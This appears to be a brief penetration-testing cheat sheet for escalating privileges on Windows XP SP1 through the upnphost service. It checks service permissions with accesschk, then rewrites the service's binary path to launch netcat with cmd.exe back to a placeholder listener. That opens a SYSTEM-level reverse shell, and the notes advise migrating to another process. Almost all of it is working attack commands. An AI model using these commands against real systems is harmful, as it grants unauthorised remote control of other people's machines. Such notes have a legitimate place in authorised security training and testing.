Upnphost service privilege escalation
Known vulnerability in Windows XP Professional SP1
Can be checked for with accesschk.exe
  accesschk.exe -ucqv upnphost
  
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc32.exe <LISTENING IP> <LISTENING PORT> -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""

test if this was enough with:
  net start upnphost
if not:
  sc config SSDPSRV start= auto
  net start SSDPSRV
  net start upnphost
  
Once reverse connection is established, quickly establish a third reverse connection
  Migrating to another process in the event that upnphost stops running
